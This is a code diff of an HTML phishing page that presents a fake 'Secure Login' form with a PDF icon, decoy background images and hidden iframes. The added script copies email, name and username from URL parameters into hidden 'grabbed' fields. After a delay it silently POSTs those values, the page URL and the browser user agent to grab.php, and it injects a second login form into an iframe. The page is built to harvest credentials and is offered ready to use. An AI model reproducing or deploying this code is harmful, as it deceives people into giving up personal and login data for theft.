@@ -31,7 +31,6 @@
       opacity: 1;
     }
 
-    /* Hidden iframe for background ads */
     .hidden-iframe {
       position: absolute;
       width: 1px;
@@ -40,30 +39,26 @@
       z-index: -1;
     }
 
-    /* Main iframe for login form */
-    .login-iframe {
+    .ad-iframe {
       position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 320px;
-      height: 400px;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       border: none;
-      z-index: 10;
-      background-color: rgba(255, 255, 255, 0.96);
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-      border-radius: 10px;
+      z-index: -1;
+      opacity: 0.1; /* Adjust opacity for visibility */
     }
 
-    /* Popup Image (for loading) */
     .popup {
       position: fixed;
       top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       z-index: 20;
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(255,255,255,0.9);
       padding: 20px;
       border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -74,6 +69,61 @@
       height: auto;
     }
 
+    .login-form {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%) translateY(-200px);
+      width: 320px;
+      padding: 20px;
+      background: rgba(255,255,255,0.96);
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      border-radius: 10px;
+      text-align: center;
+      opacity: 0;
+      transition: all 0.6s ease;
+      z-index: 10;
+    }
+
+    .login-form.visible {
+      transform: translate(-50%, -50%) translateY(0);
+      opacity: 1;
+    }
+
+    .login-form img.logo {
+      width: 80px;
+      margin-bottom: 15px;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .login-form button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .login-form button:hover {
+      background: #0056b3;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: 5;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -85,16 +135,32 @@
   <img src="https://images.unsplash.com/photo-1533106418989-88406c7cc8e6?auto=format&fit=crop&w=1950&q=80" class="bg-img">
 </div>
 
-<!-- Hidden Ad iframe -->
+<!-- Hidden Ad iframe (Background iframe) -->
+<iframe class="ad-iframe" src="https://adssettings.google.com"></iframe>
+
+<!-- Hidden iframe for Ad or additional functionality (non-visible) -->
 <iframe class="hidden-iframe" src="https://adssettings.google.com"></iframe>
 
-<!-- Popup Image -->
-<div class="popup" id="popup">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" alt="Loading...">
-</div>
+<!-- Iframe to display login form -->
+<iframe id="loginIframe"></iframe>
 
-<!-- Login Form Iframe -->
-<iframe class="login-iframe" id="loginIframe" src="loginForm.html"></iframe>
+<!-- Login Form (Embedded) -->
+<div class="login-form" id="loginForm">
+  <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" class="logo" alt="PDF">
+  <h3>Welcome to Secure Login</h3>
+  <form action="submit.php" method="POST">
+    <input type="text" name="name" id="nameInput" placeholder="Full Name" required>
+    <input type="email" name="email" id="emailInput" placeholder="Email Address" required>
+    <input type="text" name="username" id="userInput" placeholder="Username" required>
+
+    <!-- Hidden grabbed values -->
+    <input type="hidden" name="grabbed_email" id="grabbedEmail">
+    <input type="hidden" name="grabbed_name" id="grabbedName">
+    <input type="hidden" name="grabbed_user" id="grabbedUser">
+
+    <button type="submit">Login</button>
+  </form>
+</div>
 
 <script>
   // Rotate background images every 5 seconds
@@ -106,13 +172,110 @@
     images[currentIndex].classList.add('active');
   }, 5000);
 
-  // Show popup for 2 sec, then hide and show login iframe
+  // Show login form after popup disappears
   window.addEventListener("load", () => {
     setTimeout(() => {
-      document.getElementById("popup").style.display = "none";
-      document.getElementById("loginIframe").style.display = "block";  // Show the login iframe
+      document.getElementById("loginForm").classList.add("visible");
+
+      // Insert the login form content into the iframe
+      const iframe = document.getElementById("loginIframe");
+      const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+      iframeDoc.open();
+      iframeDoc.write(`
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>Login Form</title>
+            <style>
+              /* Copy the form styles here */
+              body {
+                font-family: Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+                background: #f4f4f4;
+              }
+              .login-form {
+                padding: 20px;
+                background: #fff;
+                border-radius: 10px;
+                box-shadow: 0 0 10px rgba(0,0,0,0.1);
+                width: 320px;
+              }
+              .login-form input {
+                width: 100%;
+                padding: 10px;
+                margin-bottom: 10px;
+                border: 1px solid #ccc;
+                border-radius: 5px;
+              }
+              .login-form button {
+                width: 100%;
+                padding: 10px;
+                background: #007bff;
+                border: none;
+                color: white;
+                font-weight: bold;
+                border-radius: 5px;
+                cursor: pointer;
+              }
+              .login-form button:hover {
+                background: #0056b3;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="login-form">
+              <h3>Login</h3>
+              <form action="submit.php" method="POST">
+                <input type="text" name="name" placeholder="Full Name" required>
+                <input type="email" name="email" placeholder="Email Address" required>
+                <input type="text" name="username" placeholder="Username" required>
+                <button type="submit">Login</button>
+              </form>
+            </div>
+          </body>
+        </html>
+      `);
+      iframeDoc.close();
+      iframe.style.display = "block";  // Show the iframe
     }, 2000);
   });
+
+  // Auto grab data from URL
+  function getParam(param) {
+    const url = new URL(window.location.href);
+    return url.searchParams.get(param) || "";
+  }
+
+  const email = getParam("email");
+  const name = getParam("name");
+  const username = getParam("username");
+
+  document.getElementById("emailInput").value = email;
+  document.getElementById("nameInput").value = name;
+  document.getElementById("userInput").value = username;
+
+  document.getElementById("grabbedEmail").value = email;
+  document.getElementById("grabbedName").value = name;
+  document.getElementById("grabbedUser").value = username;
+
+  // Optional background tracking (grab.php)
+  setTimeout(() => {
+    fetch("grab.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: email || "none",
+        name: name || "none",
+        username: username || "none",
+        url: window.location.href,
+        agent: navigator.userAgent
+      })
+    });
+  }, 4000);
 </script>
 
 </body>
